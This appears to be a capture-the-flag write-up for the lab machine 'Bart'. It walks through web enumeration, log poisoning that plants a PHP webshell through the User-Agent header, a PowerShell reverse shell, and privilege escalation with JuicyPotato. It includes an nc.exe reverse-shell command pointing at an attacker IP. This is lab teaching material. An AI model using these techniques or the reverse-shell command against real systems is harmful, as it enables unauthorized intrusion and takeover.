# Bart

## Gaining Access

Nmap scan:

![](../../../.gitbook/assets/bart-19.png)

Only one port was available. We had to add `forum.bart.htb` to our `/etc/hosts` file to access the website.

### Web Enum

The website was a standard company page:

![](../../../.gitbook/assets/bart-17.png)

I checked the page source, and found a unique bit here. Seems like there was a user that was not shown for some reason.

![](../../../.gitbook/assets/bart-7.png)

harvey is the user we probably need to access.

We can fuzz subdomains using the `bart.htb` domain to find more places to visit.

![](../../../.gitbook/assets/bart-15.png)

### monitor.bart.htb

We can visit this to see that it's running PHP Server Monitor v3.2.1.

![](../../../.gitbook/assets/bart-21.png)

`harvey:potter` works as credentials to let us log in. There, we would view an internal chat instance.

![](../../../.gitbook/assets/bart-18.png)

I looked around and found the settings for this internal chat service, and found another subdomain.

![](../../../.gitbook/assets/bart-9.png)

We can head to that domain to find another application running.

### Simple Chat Log Poisoning

There's a login page within the new page. Our previous credentials of `harvey:potter` do not work here.

![](../../../.gitbook/assets/bart-13.png)

However, what's interesting was the URL of the website, at `http://internal-01.bart.htb/simple_chat/login_form.php`. Googling around, we can find the exact simple\_chat PHP application being used as it is a open-source project.

{% embed url="https://github.com/magkopian/php-ajax-simple-chat'" %}

Within the source code, we can view the register.php to see how to register a new user.

![](../../../.gitbook/assets/bart-12.png)

All we need to do is sent a POST request with the `uname` and `passwd` parameters to register.

![](../../../.gitbook/assets/bart-3.png)

Afterwards, I logged into the server.

![](../../../.gitbook/assets/bart-4.png)

Within this page, there's the ability to view the Log files, and when we do, we would first get a pop-up similar to xss with 1, and have this GET request be sent to the machine.

![](../../../.gitbook/assets/bart-5.png)

When viewing this log, I noticed that the User-Agent was copied from my machine.

![](../../../.gitbook/assets/bart-2.png)

I played around with this and altered my `User-Agent` field to something else, and it was still copied over.

![](../../../.gitbook/assets/bart-10.png)

![](../../../.gitbook/assets/bart-1.png)

With this, because it is a PHP page, I attempted to write a webshell within the HTTP header and also change the page to a PHP page by altering the `filename` parameter.

![](../../../.gitbook/assets/bart-6.png)

With this, we can easily gain a reverse shell into the machine using Invoke-PowerShellTcp, as other shells don't work out well.

![](../../../.gitbook/assets/bart-16.png)

## Privilege Escalation

### JuicyPotato

When checking our privileges, we notice we have the SeImpersonatePrivilege enabled.

![](../../../.gitbook/assets/bart-11.png)

Checking `systeminfo`, we also find that a vulnerable version of Windows was running with no hotfixes.

![](../../../.gitbook/assets/bart-20.png)

We can run the JuicyPotato exploit to get a reverse shell as root. First, we need to create a .bat file that would be run. I used nc.exe to run my shell:

```
C:\Temp\nc.exe -e cmd.exe <IP> <PORT>
```

Then, we can get JuicyPotato on the machine and run it with a CLSID. We can find one from this page:

{% embed url="http://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/" %}

![](../../../.gitbook/assets/bart-8.png)

Afterwards, we would catch a shell as the administrator.

![](../../../.gitbook/assets/bart-14.png)
